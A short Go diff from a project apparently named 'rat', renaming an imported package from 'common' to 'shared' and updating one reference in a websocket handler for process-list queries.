@@ -1,7 +1,7 @@
 package main
 
 import (
-	"rat/common"
+	"rat/shared"
 
 	"encoding/json"
 
@@ -22,7 +22,7 @@ func (d ProcessQueryMessage) Handle(ws *websocket.Conn, client *Client, data str
 	var j ProcessQueryMessage
 	json.Unmarshal([]byte(data), &j)
 
-	client.Listeners[common.ProcessHeader] = ws
+	client.Listeners[shared.ProcessHeader] = ws
 
 	pids := []Process{}
 
